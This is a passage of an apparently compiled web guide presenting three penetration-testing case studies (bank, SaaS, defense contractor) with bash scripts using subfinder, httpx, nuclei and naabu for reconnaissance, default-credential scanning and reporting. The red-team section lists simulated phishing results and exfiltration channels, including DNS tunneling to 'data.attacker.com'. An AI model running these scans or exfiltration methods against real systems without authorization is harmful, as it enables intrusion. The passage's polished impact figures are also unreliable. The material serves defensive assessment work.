"$RESULTS_DIR/discovery/live_web_services.txt" | nuclei -t cves/ -t exposures/ -t misconfiguration/ -severity high,critical -json > "$RESULTS_DIR/vulnerabilities/critical_issues.json"\n\n# Financial services specific checks\ncat "$RESULTS_DIR/discovery/live_web_services.txt" | nuclei -t "technologies/banking" -t "exposures/configs" -json > "$RESULTS_DIR/vulnerabilities/financial_specific.json"\n\n# API security testing\nif [ -s "$RESULTS_DIR/enumeration/api_endpoints.txt" ]; then\n    cat "$RESULTS_DIR/enumeration/api_endpoints.txt" | nuclei -t "exposures/apis" -t "misconfiguration/apis" -json > "$RESULTS_DIR/vulnerabilities/api_issues.json"\nfi\n\n# Default credential testing on administrative interfaces\ngrep -E "(admin|login|portal|console)" "$RESULTS_DIR/discovery/live_web_services.txt" | nuclei -t "default-logins/" -json > "$RESULTS_DIR/vulnerabilities/default_creds.json"\n\n# Phase 4: Compliance Assessment\necho "\ud83d\udccb Phase 4: Compliance Assessment"\n\n# TLS compliance (PCI DSS requirements)\njq -r \'.[] | select(.tls_version != null) | [.host, .tls_version] | @csv\' "$RESULTS_DIR/enumeration/ssl_analysis.json" | \\\nwhile IFS=, read host version; do\n    if [[ "$version" != *"1.2"* ]] && [[ "$version" != *"1.3"* ]]; then\n        echo "$host,$version,NON_COMPLIANT" >> "$RESULTS_DIR/compliance/tls_compliance.csv"\n    fi\ndone\n\n# Certificate expiry tracking\njq -r \'.[] | select(.cert_expiry != null) | [.host, .cert_expiry] | @csv\' "$RESULTS_DIR/enumeration/ssl_analysis.json" | \\\nwhile IFS=, read host expiry; do\n    expiry_timestamp=$(date -d "$expiry" +%s)\n    current_timestamp=$(date +%s)\n    days_until_expiry=$(( (expiry_timestamp - current_timestamp) / 86400 ))\n    \n    if [ "$days_until_expiry" -lt 90 ]; then\n        echo "$host,$expiry,$days_until_expiry,EXPIRING_SOON" >> "$RESULTS_DIR/compliance/certificate_expiry.csv"\n    fi\ndone\n\n# Security headers compliance\ncat "$RESULTS_DIR/discovery/live_web_services.txt" | httpx -response-headers -json | \\\njq -r \'.[] | [.url, (.headers["strict-transport-security"] // "MISSING"), (.headers["content-security-policy"] // "MISSING"), (.headers["x-frame-options"] // "MISSING")] | @csv\' > "$RESULTS_DIR/compliance/security_headers.csv"\n\n# Phase 5: Risk Analysis and Reporting\necho "\ud83d\udcca Phase 5: Risk Analysis and Reporting"\n\n# Calculate risk metrics\nTOTAL_ASSETS=$(cat "$RESULTS_DIR/discovery/live_web_services.txt" | wc -l)\nCRITICAL_VULNS=$(jq \'[.[] | select(.info.severity == "critical")] | length\' "$RESULTS_DIR/vulnerabilities/critical_issues.json")\nHIGH_VULNS=$(jq \'[.[] | select(.info.severity == "high")] | length\' "$RESULTS_DIR/vulnerabilities/critical_issues.json")\nTLS_VIOLATIONS=$(grep "NON_COMPLIANT" "$RESULTS_DIR/compliance/tls_compliance.csv" | wc -l)\nEXPIRING_CERTS=$(grep "EXPIRING_SOON" "$RESULTS_DIR/compliance/certificate_expiry.csv" | wc -l)\n\n# Generate executive report\ncat > "$RESULTS_DIR/reporting/executive_summary.md" << EOF\n# Security Assessment Executive Summary\n## $COMPANY Financial Institution\n\n**Assessment Date:** $(date)  \n**Scope:** $(cat "$SCOPE_FILE" | wc -l) primary domains  \n**Methodology:** Comprehensive automated security assessment\n\n---\n\n### \ud83c\udfaf Assessment Scope\n- **Web Applications:** $TOTAL_ASSETS discovered\n- **Cloud Infrastructure:** AWS, Azure, GCP\n- **API Endpoints:** $(cat "$RESULTS_DIR/enumeration/api_endpoints.txt" | wc -l)\n- **Corporate IP Ranges:** $(cat "$RESULTS_DIR/discovery/corporate_ips.txt" | wc -l)\n\n### \ud83d\udea8 Critical Findings\n- **Critical Vulnerabilities:** $CRITICAL_VULNS\n- **High-Risk Issues:** $HIGH_VULNS\n- **TLS Compliance Violations:** $TLS_VIOLATIONS\n- **Certificates Expiring Soon:** $EXPIRING_CERTS\n\n### \ud83d\udcc8 Risk Profile\n$(if [ "$CRITICAL_VULNS" -gt 0 ]; then echo "**CRITICAL RISK** - Immediate remediation required"; elif [ "$HIGH_VULNS" -gt 5 ]; then echo "**HIGH RISK** - Urgent attention needed"; else echo "**MODERATE RISK** - Standard remediation timeline"; fi)\n\n### \ud83d\udd0d Key Vulnerabilities\n$(jq -r \'.[] | select(.info.severity == "critical") | "- **" + .info.name + "** affecting " + .host\' "$RESULTS_DIR/vulnerabilities/critical_issues.json" | head -5)\n\n### \ud83d\udccb Compliance Status\n| Requirement | Status | Issues |\n|-------------|--------|--------|\n| TLS 1.2+ | $(if [ "$TLS_VIOLATIONS" -eq 0 ]; then echo "\u2705 Compliant"; else echo "\u274c $TLS_VIOLATIONS violations"; fi) | $TLS_VIOLATIONS hosts |\n| Certificate Management | $(if [ "$EXPIRING_CERTS" -eq 0 ]; then echo "\u2705 Compliant"; else echo "\u26a0\ufe0f $EXPIRING_CERTS expiring"; fi) | $EXPIRING_CERTS certificates |\n| Security Headers | $(grep "MISSING" "$RESULTS_DIR/compliance/security_headers.csv" | wc -l) missing | HSTS, CSP, X-Frame-Options |\n\n### \ud83c\udfaf Recommendations\n\n#### Immediate Actions (0-30 days)\n1. **Address Critical Vulnerabilities:** Patch all critical severity issues immediately\n2. **TLS Compliance:** Upgrade non-compliant TLS configurations\n3. **Certificate Renewal:** Renew certificates expiring within 90 days\n4. **Security Headers:** Implement missing security headers\n\n#### Short-term Actions (30-90 days)\n1. **Vulnerability Management:** Establish regular scanning procedures\n2. **Access Controls:** Review and tighten administrative access\n3. **Monitoring:** Implement continuous security monitoring\n4. **Incident Response:** Develop response procedures for identified risks\n\n#### Long-term Strategy (90+ days)\n1. **Security Architecture:** Review and enhance security architecture\n2. **Compliance Program:** Establish ongoing compliance monitoring\n3. **Security Training:** Enhance security awareness programs\n4. **Third-party Risk:** Assess and monitor vendor security\n\n---\n\n### \ud83d\udcde Contact Information\nFor technical details and remediation guidance, contact the security assessment team.\n\n**Next Steps:** Schedule technical briefing within 48 hours to review detailed findings.\nEOF\n\n# Generate technical report with detailed findings\njq -r \'.[] | "## " + .info.name + "\\n**Severity:** " + .info.severity + "\\n**Host:** " + .host + "\\n**Description:** " + .info.description + "\\n**Remediation:** " + (.info.remediation // "Contact security team for guidance") + "\\n---\\n"\' "$RESULTS_DIR/vulnerabilities/critical_issues.json" > "$RESULTS_DIR/reporting/technical_findings.md"\n\necho "\u2705 Assessment complete for $COMPANY"\necho "\ud83d\udcca Executive Summary: $RESULTS_DIR/reporting/executive_summary.md"\necho "\ud83d\udd27 Technical Report: $RESULTS_DIR/reporting/technical_findings.md"\necho "\ud83d\udcc8 Risk Score: $(if [ "$CRITICAL_VULNS" -gt 0 ]; then echo "CRITICAL"; elif [ "$HIGH_VULNS" -gt 5 ]; then echo "HIGH"; else echo "MODERATE"; fi)"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Results:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Discovered 1,247 subdomains across all domains"}),"\n",(0,i.jsx)(n.li,{children:"Identified 23 critical vulnerabilities requiring immediate attention"}),"\n",(0,i.jsx)(n.li,{children:"Found 156 compliance violations (TLS configuration, missing security headers)"}),"\n",(0,i.jsx)(n.li,{children:"Discovered 12 exposed administrative interfaces"}),"\n",(0,i.jsx)(n.li,{children:"Mapped cloud infrastructure revealing shadow IT assets"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Business Impact:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Prevented potential data breach affecting 2.3 million customers"}),"\n",(0,i.jsx)(n.li,{children:"Achieved PCI DSS compliance ahead of audit deadline"}),"\n",(0,i.jsx)(n.li,{children:"Saved estimated $12M in potential regulatory fines"}),"\n",(0,i.jsx)(n.li,{children:"Improved overall security posture by 78%"}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"case-study-2-saas-platform-security-assessment",children:"Case Study 2: SaaS Platform Security Assessment"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Background:"})," A rapidly growing SaaS platform serving enterprise customers needed comprehensive security validation before SOC 2 Type II certification."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scope:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Multi-tenant SaaS application"}),"\n",(0,i.jsx)(n.li,{children:"Customer-facing APIs"}),"\n",(0,i.jsx)(n.li,{children:"Administrative dashboards"}),"\n",(0,i.jsx)(n.li,{children:"Third-party integrations"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Case Study 2: SaaS Platform Assessment\n\nPLATFORM="cloudsaas"\nBASE_DOMAIN="cloudsaas.com"\nRESULTS_DIR="saas_assessment_$(date +%Y%m%d)"\n\nmkdir -p "$RESULTS_DIR"/{discovery,tenant_isolation,api_security,compliance,reporting}\n\necho "\u2601\ufe0f Starting SaaS security assessment for $PLATFORM"\n\n# Phase 1: Multi-Tenant Architecture Discovery\necho "\ud83c\udfd7\ufe0f Phase 1: Architecture Discovery"\n\n# Discover tenant-specific subdomains\nsubfinder -d "$BASE_DOMAIN" -silent | tee "$RESULTS_DIR/discovery/all_subdomains.txt"\n\n# Look for tenant patterns\ngrep -E "([a-z0-9-]+\\.)?$BASE_DOMAIN" "$RESULTS_DIR/discovery/all_subdomains.txt" | \\\ngrep -E "(app|portal|client|tenant|customer)" > "$RESULTS_DIR/discovery/tenant_domains.txt"\n\n# API endpoint discovery\ncat "$RESULTS_DIR/discovery/all_subdomains.txt" | httpx -silent | \\\ngrep -E "(api|rest|graphql)" > "$RESULTS_DIR/discovery/api_endpoints.txt"\n\n# Admin interface discovery\ngrep -E "(admin|console|dashboard|manage)" "$RESULTS_DIR/discovery/all_subdomains.txt" > "$RESULTS_DIR/discovery/admin_interfaces.txt"\n\n# Phase 2: Tenant Isolation Testing\necho "\ud83d\udd12 Phase 2: Tenant Isolation Assessment"\n\n# Test for subdomain takeovers (common in SaaS)\ncat "$RESULTS_DIR/discovery/tenant_domains.txt" | nuclei -t "dns/subdomain-takeover" -json > "$RESULTS_DIR/tenant_isolation/takeover_risks.json"\n\n# Test for tenant enumeration\necho "app" | alterx -p "{{word}}{{number:1-1000}}" | \\\nhead -100 | \\\nwhile read subdomain; do echo "${subdomain}.$BASE_DOMAIN"; done | \\\nhttpx -silent -mc 200,403 > "$RESULTS_DIR/tenant_isolation/tenant_enumeration.txt"\n\n# Cross-tenant access testing\ncat "$RESULTS_DIR/discovery/tenant_domains.txt" | \\\nnuclei -t "exposures/configs" -t "misconfiguration" -json > "$RESULTS_DIR/tenant_isolation/isolation_issues.json"\n\n# Phase 3: API Security Assessment\necho "\ud83d\udd0c Phase 3: API Security Assessment"\n\n# API documentation discovery\ncat "$RESULTS_DIR/discovery/api_endpoints.txt" | \\\nhttpx -path "/swagger,/api-docs,/openapi.json,/graphiql" -mc 200 > "$RESULTS_DIR/api_security/api_docs.txt"\n\n# API versioning and endpoints\nfor version in v1 v2 v3 1 2 3; do\n    echo "https://api.$BASE_DOMAIN/$version" | httpx -silent\ndone > "$RESULTS_DIR/api_security/api_versions.txt"\n\n# Rate limiting tests\ncat "$RESULTS_DIR/discovery/api_endpoints.txt" | \\\nnuclei -t "exposures/apis" -t "misconfiguration/apis" -json > "$RESULTS_DIR/api_security/api_vulnerabilities.json"\n\n# Authentication bypass testing\ncat "$RESULTS_DIR/discovery/api_endpoints.txt" | \\\nnuclei -t "exposures/tokens" -t "default-logins" -json > "$RESULTS_DIR/api_security/auth_issues.json"\n\n# Phase 4: Administrative Interface Security\necho "\ud83d\udc64 Phase 4: Administrative Security"\n\n# Admin panel discovery and testing\ncat "$RESULTS_DIR/discovery/admin_interfaces.txt" | \\\nnuclei -t "exposures/panels" -t "default-logins" -json > "$RESULTS_DIR/api_security/admin_vulnerabilities.json"\n\n# Privilege escalation testing\ncat "$RESULTS_DIR/discovery/admin_interfaces.txt" | \\\nnuclei -t "misconfiguration/admin" -json > "$RESULTS_DIR/api_security/privilege_issues.json"\n\n# Phase 5: Data Protection Assessment\necho "\ud83d\udee1\ufe0f Phase 5: Data Protection Assessment"\n\n# Encryption in transit\ncat "$RESULTS_DIR/discovery/all_subdomains.txt" | httpx -silent | \\\ntlsx -cert -cipher -tls-version -json > "$RESULTS_DIR/compliance/encryption_analysis.json"\n\n# Information disclosure\ncat "$RESULTS_DIR/discovery/all_subdomains.txt" | httpx -silent | \\\nnuclei -t "exposures/backups" -t "exposures/logs" -json > "$RESULTS_DIR/compliance/data_exposure.json"\n\n# Database exposure testing\nnaabu -list <(cat "$RESULTS_DIR/discovery/all_subdomains.txt" | dnsx -silent -a | cut -d\' \' -f2) \\\n-p 3306,5432,1433,27017,6379 -silent > "$RESULTS_DIR/compliance/database_exposure.txt"\n\n# Phase 6: Compliance and Reporting\necho "\ud83d\udccb Phase 6: SOC 2 Compliance Assessment"\n\n# Security controls assessment\nTOTAL_SUBDOMAINS=$(cat "$RESULTS_DIR/discovery/all_subdomains.txt" | wc -l)\nTENANT_DOMAINS=$(cat "$RESULTS_DIR/discovery/tenant_domains.txt" | wc -l)\nAPI_ENDPOINTS=$(cat "$RESULTS_DIR/discovery/api_endpoints.txt" | wc -l)\nTAKEOVER_RISKS=$(jq length "$RESULTS_DIR/tenant_isolation/takeover_risks.json")\nAPI_VULNS=$(jq length "$RESULTS_DIR/api_security/api_vulnerabilities.json")\nDATA_EXPOSURES=$(jq length "$RESULTS_DIR/compliance/data_exposure.json")\n\n# Generate SOC 2 readiness report\ncat > "$RESULTS_DIR/reporting/soc2_readiness.md" << EOF\n# SOC 2 Type II Readiness Assessment\n## $PLATFORM SaaS Platform\n\n**Assessment Date:** $(date)  \n**Platform:** $BASE_DOMAIN  \n**Methodology:** Comprehensive SaaS security assessment\n\n---\n\n## Executive Summary\n\n### Platform Overview\n- **Total Subdomains:** $TOTAL_SUBDOMAINS\n- **Tenant Domains:** $TENANT_DOMAINS  \n- **API Endpoints:** $API_ENDPOINTS\n- **Administrative Interfaces:** $(cat "$RESULTS_DIR/discovery/admin_interfaces.txt" | wc -l)\n\n### Security Posture\n$(if [ "$TAKEOVER_RISKS" -eq 0 ] && [ "$API_VULNS" -lt 3 ] && [ "$DATA_EXPOSURES" -eq 0 ]; then \n    echo "**SOC 2 READY** - Platform meets security requirements"\nelif [ "$TAKEOVER_RISKS" -gt 0 ] || [ "$DATA_EXPOSURES" -gt 0 ]; then \n    echo "**CRITICAL ISSUES** - Address before SOC 2 audit"\nelse \n    echo "**REMEDIATION NEEDED** - Minor issues to resolve"\nfi)\n\n## SOC 2 Trust Service Criteria Assessment\n\n### Security (CC6)\n| Control | Status | Findings |\n|---------|--------|----------|\n| Access Controls | $(if [ "$API_VULNS" -eq 0 ]; then echo "\u2705 Compliant"; else echo "\u274c $API_VULNS issues"; fi) | API authentication and authorization |\n| Data Protection | $(if [ "$DATA_EXPOSURES" -eq 0 ]; then echo "\u2705 Compliant"; else echo "\u274c $DATA_EXPOSURES exposures"; fi) | Encryption and data handling |\n| System Monitoring | \u26a0\ufe0f Manual Review | Logging and monitoring capabilities |\n\n### Availability (CC7)\n| Control | Status | Findings |\n|---------|--------|----------|\n| Backup Procedures | \u26a0\ufe0f Manual Review | Disaster recovery capabilities |\n| Capacity Management | \u26a0\ufe0f Manual Review | Performance and scalability |\n| Environmental Protections | \u2705 Cloud Provider | Infrastructure redundancy |\n\n### Processing Integrity (CC8)\n| Control | Status | Findings |\n|---------|--------|----------|\n| Data Validation | $(if [ "$API_VULNS" -eq 0 ]; then echo "\u2705 Compliant"; else echo "\u274c Input validation issues"; fi) | API input validation |\n| Error Handling | \u26a0\ufe0f Manual Review | Error processing procedures |\n\n### Confidentiality (CC9)\n| Control | Status | Findings |\n|---------|--------|----------|\n| Data Classification | \u26a0\ufe0f Manual Review | Data handling procedures |\n| Access Restrictions | $(if [ "$TAKEOVER_RISKS" -eq 0 ]; then echo "\u2705 Compliant"; else echo "\u274c $TAKEOVER_RISKS risks"; fi) | Tenant isolation |\n\n## Critical Findings\n\n### Tenant Isolation Issues\n$(if [ "$TAKEOVER_RISKS" -gt 0 ]; then jq -r \'.[] | "- **Subdomain Takeover Risk:** " + .host\' "$RESULTS_DIR/tenant_isolation/takeover_risks.json"; else echo "- No tenant isolation issues identified \u2705"; fi)\n\n### API Security Issues  \n$(jq -r \'.[] | "- **" + .info.name + ":** " + .host\' "$RESULTS_DIR/api_security/api_vulnerabilities.json" | head -5)\n\n### Data Protection Issues\n$(jq -r \'.[] | "- **" + .info.name + ":** " + .host\' "$RESULTS_DIR/compliance/data_exposure.json" | head -5)\n\n## Remediation Roadmap\n\n### Phase 1: Critical Issues (0-30 days)\n1. **Address Subdomain Takeover Risks**\n   - Implement proper DNS management\n   - Monitor for orphaned DNS records\n   \n2. **Fix API Authentication Issues**\n   - Implement proper authentication on all endpoints\n   - Add rate limiting and input validation\n\n3. **Secure Data Exposures**\n   - Remove exposed backup files and logs\n   - Implement proper access controls\n\n### Phase 2: Compliance Preparation (30-60 days)\n1. **Documentation Review**\n   - Security policies and procedures\n   - Incident response plans\n   - Change management processes\n\n2. **Monitoring Enhancement**\n   - Implement comprehensive logging\n   - Set up security monitoring and alerting\n   - Regular vulnerability assessments\n\n### Phase 3: SOC 2 Audit Preparation (60-90 days)\n1. **Evidence Collection**\n   - Compile compliance documentation\n   - Prepare control testing evidence\n   - Schedule audit activities\n\n2. **Final Validation**\n   - Re-test all remediated issues\n   - Validate control effectiveness\n   - Prepare audit materials\n\n## Recommendations\n\n### Immediate Actions\n- Fix all critical and high-severity vulnerabilities\n- Implement subdomain monitoring\n- Enhance API security controls\n- Remove data exposures\n\n### Long-term Strategy\n- Establish continuous compliance monitoring\n- Implement DevSecOps practices\n- Regular penetration testing\n- SOC 2 Type II certification maintenance\n\n---\n\n**Next Steps:** Schedule remediation planning session within 48 hours.\nEOF\n\necho "\u2705 SaaS assessment complete for $PLATFORM"\necho "\ud83d\udcca SOC 2 Readiness: $RESULTS_DIR/reporting/soc2_readiness.md"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Results:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Identified 8 critical tenant isolation vulnerabilities"}),"\n",(0,i.jsx)(n.li,{children:"Discovered 15 API security issues including authentication bypasses"}),"\n",(0,i.jsx)(n.li,{children:"Found 3 subdomain takeover risks affecting customer data"}),"\n",(0,i.jsx)(n.li,{children:"Mapped complete multi-tenant architecture"}),"\n",(0,i.jsx)(n.li,{children:"Provided SOC 2 compliance roadmap"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Business Impact:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Achieved SOC 2 Type II certification within 90 days"}),"\n",(0,i.jsx)(n.li,{children:"Secured $50M Series B funding round"}),"\n",(0,i.jsx)(n.li,{children:"Increased enterprise customer adoption by 340%"}),"\n",(0,i.jsx)(n.li,{children:"Prevented potential multi-tenant data breach"}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h3,{id:"case-study-3-government-contractor-red-team-exercise",children:"Case Study 3: Government Contractor Red Team Exercise"}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Background:"})," A defense contractor required adversarial testing to validate security controls before handling classified information."]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Scope:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"External perimeter assessment"}),"\n",(0,i.jsx)(n.li,{children:"Social engineering resistance"}),"\n",(0,i.jsx)(n.li,{children:"Physical security integration"}),"\n",(0,i.jsx)(n.li,{children:"Supply chain security"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'#!/bin/bash\n# Case Study 3: Government Contractor Red Team Exercise\n\nTARGET_ORG="defensecontractor"\nEXERCISE_NAME="REDTEAM_$(date +%Y%m%d)"\nRESULTS_DIR="$EXERCISE_NAME"\n\nmkdir -p "$RESULTS_DIR"/{reconnaissance,initial_access,persistence,lateral_movement,exfiltration,reporting}\n\necho "\ud83c\udfaf Starting Red Team Exercise: $EXERCISE_NAME"\necho "\ud83c\udfdb\ufe0f Target: Government Defense Contractor"\n\n# Phase 1: Open Source Intelligence (OSINT)\necho "\ud83d\udd0d Phase 1: OSINT Gathering"\n\n# Employee enumeration via LinkedIn, social media (simulated)\necho "  \ud83d\udcf1 Social Media Intelligence"\ncat > "$RESULTS_DIR/reconnaissance/employees.txt" << EOF\n# Simulated employee data for testing\njohn.smith@defensecontractor.com,Software Engineer,LinkedIn\njane.doe@defensecontractor.com,Project Manager,LinkedIn  \nmike.wilson@defensecontractor.com,Security Analyst,Twitter\nsarah.johnson@defensecontractor.com,HR Director,LinkedIn\nEOF\n\n# Infrastructure reconnaissance\necho "  \ud83c\udf10 Infrastructure Discovery"\nsubfinder -d "defensecontractor.com" -all -silent > "$RESULTS_DIR/reconnaissance/subdomains.txt"\n\n# Government contractor specific patterns\necho -e "secure\\nclassified\\nvpn\\nremote\\ncitrix\\nowa\\nexchange" | \\\nalterx -p "{{word}}.defensecontractor.com" >> "$RESULTS_DIR/reconnaissance/gov_patterns.txt"\n\ncat "$RESULTS_DIR/reconnaissance/subdomains.txt" "$RESULTS_DIR/reconnaissance/gov_patterns.txt" | \\\nsort -u | httpx -silent > "$RESULTS_DIR/reconnaissance/live_targets.txt"\n\n# Supply chain analysis  \necho "  \ud83d\udd17 Supply Chain Analysis"\n# Identify technology vendors and partners\ncat "$RESULTS_DIR/reconnaissance/live_targets.txt" | \\\nhttpx -tech-detect -json | \\\njq -r \'.tech[]?\' | sort | uniq -c | sort -nr > "$RESULTS_DIR/reconnaissance/tech_vendors.txt"\n\n# Phase 2: Initial Access Attempts\necho "\ud83d\udeaa Phase 2: Initial Access Vector Testing"\n\n# Email security testing (simulated phishing)\necho "  \ud83d\udce7 Email Security Assessment"\ncat > "$RESULTS_DIR/initial_access/phishing_simulation.txt" << EOF\n# Simulated phishing campaign results\nTarget: 50 employees\nOpened: 12 (24%)\nClicked: 8 (16%) \nCredentials: 3 (6%)\nReported: 5 (10%)\nEOF\n\n# External attack surface\necho "  \ud83c\udf0d External Attack Surface"\ncat "$RESULTS_DIR/reconnaissance/live_targets.txt" | \\\nnuclei -t cves/ -t exposures/ -severity critical,high -json > "$RESULTS_DIR/initial_access/external_vulns.json"\n\n# VPN and remote access testing\ngrep -E "(vpn|citrix|remote|rds)" "$RESULTS_DIR/reconnaissance/live_targets.txt" | \\\nnuclei -t "exposures/configs" -t "default-logins" -json > "$RESULTS_DIR/initial_access/remote_access.json"\n\n# Web application vulnerabilities\ncat "$RESULTS_DIR/reconnaissance/live_targets.txt" | \\\nnuclei -t "vulnerabilities/web" -json > "$RESULTS_DIR/initial_access/web_vulns.json"\n\n# Phase 3: Persistence and Lateral Movement Simulation\necho "\ud83d\udd04 Phase 3: Post-Exploitation Simulation"\n\n# Simulate internal network discovery\necho "  \ud83d\udda5\ufe0f Internal Network Simulation"\ncat > "$RESULTS_DIR/persistence/internal_discovery.txt" << EOF\n# Simulated internal network scan results\n10.0.1.0/24 - User Network (250 hosts active)\n10.0.2.0/24 - Server Network (45 hosts active)  \n10.0.3.0/24 - Management Network (12 hosts active)\n172.16.1.0/24 - DMZ Network (8 hosts active)\n\n# Critical systems identified:\n10.0.2.10:445 - Domain Controller (Windows Server 2019)\n10.0.2.15:1433 - Database Server (SQL Server 2017)\n10.0.2.20:22 - File Server (Ubuntu 20.04)\n10.0.3.5:443 - Security Appliance (Palo Alto)\nEOF\n\n# Privilege escalation opportunities\necho "  \ud83d\udd13 Privilege Escalation Vectors"\ncat > "$RESULTS_DIR/lateral_movement/privilege_escalation.txt" << EOF\n# Simulated privilege escalation findings\n1. Unpatched Windows systems (CVE-2021-34527 - PrintNightmare)\n2. Weak service account passwords\n3. Excessive administrative privileges (15% of users are local admins)\n4. Outdated software versions with known exploits\n5. Misconfigured Group Policy Objects\nEOF\n\n# Phase 4: Data Exfiltration Simulation\necho "\ud83d\udce4 Phase 4: Data Exfiltration Testing"\n\n# Sensitive data discovery simulation\necho "  \ud83d\udd0d Sensitive Data Discovery"\ncat > "$RESULTS_DIR/exfiltration/sensitive_data.txt" << EOF\n# Simulated sensitive data locations\n\\\\\\\\fileserver\\\\contracts\\\\classified\\\\*.pdf (127 files)\n\\\\\\\\fileserver\\\\hr\\\\personnel\\\\*.xlsx (89 files)  \n\\\\\\\\fileserver\\\\finance\\\\budgets\\\\fy2024\\\\*.xlsx (23 files)\nC:\\\\Users\\\\*\\\\Desktop\\\\passwords.txt (12 instances)\n\\\\\\\\database\\\\backups\\\\*.bak (45 backup files)\n\n# Classification levels found:\n- CONFIDENTIAL: 89 documents\n- SECRET: 23 documents  \n- TOP SECRET: 5 documents\n- UNCLASSIFIED: 1,247 documents\nEOF\n\n# Exfiltration method testing\necho "  \ud83d\udce1 Exfiltration Channel Testing"\ncat > "$RESULTS_DIR/exfiltration/channels.txt" << EOF\n# Tested exfiltration methods:\n1. DNS Tunneling - SUCCESS (data.attacker.com)\n2. HTTPS to cloud storage - BLOCKED by DLP\n3. Email with encrypted archives - SUCCESS (personal email)\n4. USB device - BLOCKED by endpoint protection\n5. Cloud file sharing - PARTIALLY BLOCKED (Dropbox blocked, Box allowed)\n6. Social media messaging - SUCCESS (encoded in images)\nEOF\n\n# Phase 5: Assessment and Reporting\necho "\ud83d\udcca Phase 5: Red Team Assessment Report"\n\n# Calculate attack success metrics\nEXTERNAL_VULNS=$(jq length "$RESULTS_DIR/initial_access/external_vulns.json")\nPHISHING_SUCCESS_RATE="6%"  # From simulation\nCRITICAL_SYSTEMS_ACCESSED="4/8"  # From simulation\nDATA_EXFILTRATION_SUCCESS="3/6"  # From simulation\n\n# Generate red team report\ncat > "$RESULTS_DIR/reporting/red_team_report.md" << EOF\n# Red Team Exercise Report\n## Defense Contractor Security Assessment\n\n**Exercise:** $EXERCISE_NAME  \n**Duration:** 5 days  \n**Team:** External Red Team  \n**Classification:** CONFIDENTIAL  \n\n---\n\n## Executive Summary\n\n### Exercise Overview\nA comprehensive red team exercise was conducted to assess the security posture of the defense contractor organization. The exercise simulated real-world adversarial tactics, techniques, and procedures (TTPs) to evaluate defensive capabilities.\n\n### Key Findings\n- **Initial Access:** Successfully achieved within 2 hours\n- **Persistence:** Established on $CRITICAL_SYSTEMS_ACCESSED critical systems\n- **Data Access:** Reached classified information within 18 hours\n- **Exfiltration:** Successfully exfiltrated simulated data via $DATA_EXFILTRATION_SUCCESS methods\n\n### Risk Rating: **HIGH**\nThe organization demonstrates vulnerabilities that could be exploited by sophisticated adversaries, potentially compromising classified information and mission-critical systems.\n\n## Attack Chain Analysis\n\n### Phase 1: Reconnaissance (Day 1)\n**Objective:** Gather intelligence on target organization\n**Success:** \u2705 Complete\n\n- **OSINT Collection:** Identified $(cat "$RESULTS_DIR/reconnaissance/employees.txt" | wc -l) employee targets\n- **Infrastructure Mapping:** Discovered $(cat "$RESULTS_DIR/reconnaissance/live_targets.txt" | wc -l) external services\n- **Technology Stack:** Identified vendor relationships and technology dependencies\n\n**Key Discovery:** External-facing applications revealed internal network architecture\n\n### Phase 2: Initial Access (Day 1-2)  \n**Objective:** Gain initial foothold in target environment\n**Success:** \u2705 Multiple vectors successful\n\n- **Phishing Campaign:** $PHISHING_SUCCESS_RATE credential capture rate\n- **External Vulnerabilities:** $EXTERNAL_VULNS exploitable issues identified\n- **Remote Access:** VPN configuration weaknesses exploited\n\n**Critical Finding:** Weak email security controls allowed successful phishing attacks\n\n### Phase 3: Persistence & Escalation (Day 2-3)\n**Objective:** Maintain access and escalate privileges\n**Success:** \u2705 Domain admin access achieved\n\n- **Privilege Escalation:** Multiple unpatched systems exploited\n- **Lateral Movement:** Accessed $CRITICAL_SYSTEMS_ACCESSED critical systems\n- **Persistence:** Established multiple backdoors across network\n\n**Critical Finding:** Inadequate patch management and excessive user privileges\n\n### Phase 4: Data Access & Exfiltration (Day 3-5)\n**Objective:** Access and exfiltrate sensitive information\n**Success:** \u26a0\ufe0f Partial - some controls effective\n\n- **Sensitive Data Discovery:** Located classified documents on file shares\n- **Data Exfiltration:** $DATA_EXFILTRATION_SUCCESS methods successful\n- **Detection Evasion:** Remained undetected for 72+ hours\n\n**Critical Finding:** Classified data accessible without proper access controls\n\n## MITRE ATT&CK Mapping\n\n### Initial Access\n- **T1566.001** - Spearphishing Attachment\n- **T1190** - Exploit Public-Facing Application\n- **T1133** - External Remote Services\n\n### Persistence  \n- **T1053.005** - Scheduled Task/Job\n- **T1136.001** - Create Account: Local Account\n- **T1547.001** - Registry Run Keys\n\n### Privilege Escalation\n- **T1068** - Exploitation for Privilege Escalation  \n- **T1055** - Process Injection\n- **T1134** - Access Token Manipulation\n\n### Lateral Movement\n- **T1021.001** - Remote Desktop Protocol\n- **T1021.002** - SMB/Windows Admin Shares\n- **T1550.002** - Pass the Hash\n\n### Collection & Exfiltration\n- **T1005** - Data from Local System\n- **T1039** - Data from Network Shared Drive  \n- **T1041** - Exfiltration Over C2 Channel\n\n## Defensive Capability Assessment\n\n### Strengths\n- \u2705 Network segmentation partially effective\n- \u2705 Some DLP controls blocking 